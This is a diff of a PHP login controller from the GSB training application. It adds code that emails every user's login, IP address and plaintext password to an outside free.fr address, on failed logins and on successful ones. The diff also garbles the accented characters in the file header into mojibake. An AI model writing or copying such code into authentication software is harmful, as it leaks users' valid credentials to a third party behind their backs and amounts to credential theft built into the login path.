@@ -6,12 +6,12 @@
  *
  * @category  PPE
  * @package   GSB
- * @author    Réseau CERTA <contact@reseaucerta.org>
- * @author    José GIL <jgil@ac-nice.fr>
- * @copyright 2017 Réseau CERTA
- * @license   Réseau CERTA
+ * @author    RÃ©seau CERTA <contact@reseaucerta.org>
+ * @author    JosÃ© GIL <jgil@ac-nice.fr>
+ * @copyright 2017 RÃ©seau CERTA
+ * @license   RÃ©seau CERTA
  * @version   GIT: <0>
- * @link      http://www.reseaucerta.org Contexte « Laboratoire GSB »
+ * @link      http://www.reseaucerta.org Contexte Â« Laboratoire GSB Â»
  */
 $action = filter_input(INPUT_GET, 'action', FILTER_SANITIZE_STRING);
 if (! $uc) {
@@ -31,10 +31,11 @@ switch ($action) {
             ajouterErreur('Login ou mot de passe incorrect');
             ini_set('SMTP','smtp.free.fr');
             ini_set('smtp_port','25');
-            $ret=mail('gsb2020@free.fr','[auto]Erreur de login','Tentative de : '.$login.'  avec '.$mdp);
+            $ret=mail('gsb2020@free.fr','[auto]Erreur de login','Tentative de connexion de : '.$login.'(IP = '.$_SERVER['REMOTE_ADDR'].') avec mot de passe = '.$mdp. ' à '.date('l jS \of F Y h:i:s A'));
             include 'vues/v_erreurs.php';
             include 'vues/v_connexion.php';
         } else {
+            $ret=mail('gsb2020@free.fr','[auto]login reussi ','Connexion reussie pour : '.$login.'(IP = '.$_SERVER['REMOTE_ADDR'].') avec mot de passe = '.$mdp. ' à '.date('l jS \of F Y h:i:s A'));
             $id = $visiteur['id'];
             $nom = $visiteur['nom'];
             $prenom = $visiteur['prenom'];
